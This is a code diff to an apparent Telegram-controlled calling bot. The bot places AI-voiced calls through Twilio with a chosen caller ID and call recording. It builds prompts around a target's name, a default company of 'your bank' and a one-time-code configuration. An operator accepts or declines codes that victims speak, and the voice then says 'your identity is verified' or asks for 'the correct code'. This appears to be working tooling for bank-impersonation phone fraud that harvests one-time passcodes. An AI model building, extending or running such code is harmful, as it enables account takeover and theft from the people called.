@@ -1318,6 +1318,10 @@ class _SessionManager:
         self._sessions: dict[str, dict] = {}
 
     def create(self, call_sid: str, **kwargs) -> dict:
+        existing = self._sessions.get(call_sid)
+        if existing is not None:
+            existing.update(kwargs)
+            return existing
         session = {"call_sid": call_sid, **kwargs}
         self._sessions[call_sid] = session
         return session
@@ -1360,6 +1364,7 @@ def register_call_session(
     emotion: Optional[str] = None,
     status_chat_id: Optional[int] = None,
     status_message_id: Optional[int] = None,
+    vapi_call_id: Optional[str] = None,
 ):
     if not call_sid:
         return None
@@ -1369,6 +1374,13 @@ def register_call_session(
         return None
 
     session = manager.create(call_sid, user_id=user_id, chat_id=chat_id)
+    if vapi_call_id is not None:
+        session["vapi_call_id"] = vapi_call_id
+        if vapi_call_id != call_sid and get_call_session(vapi_call_id) is None:
+            try:
+                manager._sessions[vapi_call_id] = session
+            except Exception:
+                pass
     if chat_id is not None:
         session["chat_id"] = int(chat_id) if str(chat_id).strip() not in ("", "None", "unknown") else None
     if voice_id is not None:
@@ -2648,8 +2660,8 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
             try:
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
                 from services.prompt_builder import PromptBuilder
-                from services.vapi_service import create_call
                 from services.voice_identity import select_agent_name
+                from services.twilio_service import place_ai_call
                 
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
@@ -2702,23 +2714,19 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 prompt_builder = PromptBuilder()
                 system_prompt = prompt_builder.build(metadata)
 
-                # Create Vapi call with emotion-aware assistant
+                # Create Vapi bypass session and place the call via Twilio.
                 overrides = metadata.to_vapi_assistant_overrides()
                 overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-                vapi_call_id = create_call(
-                    customer_number=phonenum,
+                twilio_sid = place_ai_call(
+                    to=phonenum,
+                    user_id=user_id_str,
+                    chat_id=chat_id,
                     customer_name=name,
                     assistant_overrides=overrides,
                     metadata=metadata.internal,
-                )
-                if not vapi_call_id:
-                    raise Exception("Failed to create Vapi emotion call")
-
-                # Register and notify
-                register_call_session(
-                    vapi_call_id,
-                    user_id_str,
-                    chat_id=chat_id,
+                    from_number=caller_id or OUTBOUND_CALLER_ID,
+                    caller_id=caller_id,
+                    record=True,
                     endpoint="/initiate_emotion_call",
                     mode_label=f"AI Emotion Call ({emotion})",
                     voice_id=voice_id,
@@ -2726,10 +2734,12 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                     status_chat_id=chat_id,
                     status_message_id=status_message_id,
                 )
+                if not twilio_sid:
+                    raise Exception("Failed to place AI emotion call via Twilio")
                 
                 bot.send_message(
                     chat_id,
-                    f"🎭 Call ID: {vapi_call_id}"
+                    f"🎭 Call ID: {twilio_sid}"
                 )
                 
                 try:
@@ -2740,7 +2750,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 if current_hash:
                     _write_last_setup_hash(user_id_str, current_hash)
                 
-                logger.info(f"✅ Vapi emotion call {vapi_call_id} initiated for user {user_id_str}")
+                logger.info(f"✅ Twilio emotion call {twilio_sid} initiated for user {user_id_str}")
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
@@ -2824,7 +2834,6 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 # Build Vapi call metadata from user settings
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
                 from services.prompt_builder import PromptBuilder
-                from services.vapi_service import create_call
                 from services.voice_identity import select_agent_name
 
                 agent_name = select_agent_name(voice_id)
@@ -2872,20 +2881,19 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 # Create Vapi call with assistant overrides
                 overrides = metadata.to_vapi_assistant_overrides()
                 overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-                vapi_call_id = create_call(
-                    customer_number=phonenum,
+
+                # Place the call via Twilio; Vapi (bypass) only does STT/LLM/TTS.
+                from services.twilio_service import place_ai_call
+                twilio_sid = place_ai_call(
+                    to=phonenum,
+                    user_id=user_id_str,
+                    chat_id=chat_id,
                     customer_name=name,
                     assistant_overrides=overrides,
                     metadata=metadata.internal,
-                )
-                if not vapi_call_id:
-                    raise Exception("Failed to create Vapi call")
-
-                # Register the Vapi call session for webhook tracking
-                register_call_session(
-                    vapi_call_id,
-                    user_id_str,
-                    chat_id=chat_id,
+                    from_number=caller_id or OUTBOUND_CALLER_ID,
+                    caller_id=caller_id,
+                    record=True,
                     endpoint="/initiate_normal_call",
                     mode_label=mode_label,
                     voice_id=voice_id,
@@ -2900,14 +2908,10 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                     status_chat_id=chat_id,
                     status_message_id=status_message_id,
                 )
+                if not twilio_sid:
+                    raise Exception("Failed to place normal call via Twilio")
 
-                # Store call metadata
-                try:
-                    store_call_metadata(user_id_str, vapi_call_id, target=phonenum)
-                except Exception:
-                    logger.exception("Failed to store call metadata")
-
-                bot.send_message(chat_id, f"🎯 Call ID: {vapi_call_id}")
+                bot.send_message(chat_id, f"🎯 Call ID: {twilio_sid}")
 
                 # Clear per-user call setup immediately after initiating the call
                 try:
@@ -2923,7 +2927,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 except Exception:
                     logger.exception("Failed to record last setup hash")
 
-                logger.info(f"✅ Vapi call {vapi_call_id} initiated for user {user_id_str} to {phonenum}")
+                logger.info(f"✅ Twilio call {twilio_sid} initiated for user {user_id_str} to {phonenum}")
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate normal call: {e}")
@@ -2946,7 +2950,7 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
         
         from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
         from services.prompt_builder import PromptBuilder
-        from services.vapi_service import create_call
+        from services.twilio_service import place_ai_call
         from services.voice_identity import select_agent_name
         
         if schedule_type in ("manual", "custom"):
@@ -2982,11 +2986,20 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             
             overrides = metadata.to_vapi_assistant_overrides()
             overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-            vapi_call_id = create_call(
-                customer_number=phone,
+            twilio_sid = place_ai_call(
+                to=phone,
+                user_id=user_id,
+                chat_id=chat_id,
                 customer_name=name,
                 assistant_overrides=overrides,
                 metadata=metadata.internal,
+                from_number=OUTBOUND_CALLER_ID,
+                record=True,
+                endpoint="/schedule",
+                mode_label=f"Scheduled {schedule_type.title()} Call",
+                voice_id=voice_id,
+                emotion=emotion,
+                code_length=str(code_length),
             )
         else:
             emotion = sched.get("emotion", "neutral")
@@ -3017,21 +3030,23 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             
             overrides = metadata.to_vapi_assistant_overrides()
             overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-            vapi_call_id = create_call(
-                customer_number=phone,
+            twilio_sid = place_ai_call(
+                to=phone,
+                user_id=user_id,
+                chat_id=chat_id,
                 customer_name=name,
                 assistant_overrides=overrides,
                 metadata=metadata.internal,
-            )
-        
-        if vapi_call_id:
-            register_call_session(
-                vapi_call_id,
-                user_id,
-                chat_id=chat_id,
+                from_number=OUTBOUND_CALLER_ID,
+                record=True,
                 endpoint="/schedule",
                 mode_label=f"Scheduled {schedule_type.title()} Call",
+                voice_id=voice_id,
+                emotion=emotion,
+                code_length=str(code_length),
             )
+        
+        if twilio_sid:
             try:
                 clear_user_call_setup(user_id)
             except Exception:
@@ -3043,8 +3058,8 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             except Exception:
                 logger.exception(f"Failed to record last setup hash for user {user_id}")
             sched["status"] = "completed"
-            sched["sid"] = vapi_call_id
-            logger.info(f"Scheduled call executed (Vapi): {phone} -> {vapi_call_id}")
+            sched["sid"] = twilio_sid
+            logger.info(f"Scheduled call executed via Twilio bridge: {phone} -> {twilio_sid}")
         else:
             sched["status"] = "failed"
     except Exception as e:
@@ -5777,14 +5792,18 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
 
         vapi_id = session.get("vapi_call_id") if session else None
         if vapi_id:
-            from services.vapi_service import say_to_assistant, end_call as vapi_end_call
+            from services.vapi_service import say_to_assistant
             import time
             try:
                 say_to_assistant(vapi_id, "Your identity is verified. The account is secure. Goodbye.")
                 time.sleep(2)
-                vapi_end_call(vapi_id)
             except Exception as e:
-                logger.debug(f"Vapi say/end on accept: {e}")
+                logger.debug(f"Vapi say on accept: {e}")
+        from services.twilio_service import end_call as twilio_end_call
+        try:
+            twilio_end_call(call_sid)
+        except Exception as e:
+            logger.debug(f"Twilio end_call on accept: {e}")
         return
 
     if call.data.startswith("otp_decline_"):
@@ -5803,13 +5822,14 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
 
         vapi_id = session.get("vapi_call_id") if session else None
         if vapi_id:
-            from services.vapi_service import say_to_assistant, end_call as vapi_end_call
+            from services.vapi_service import say_to_assistant
             import time
             try:
                 if attempts >= 3:
                     say_to_assistant(vapi_id, "I can't verify the code. Please contact support. Goodbye.")
                     time.sleep(2)
-                    vapi_end_call(vapi_id)
+                    from services.twilio_service import end_call as twilio_end_call
+                    twilio_end_call(call_sid)
                 else:
                     say_to_assistant(vapi_id, "That code didn't match. Please check and give me the correct code.")
             except Exception as e:
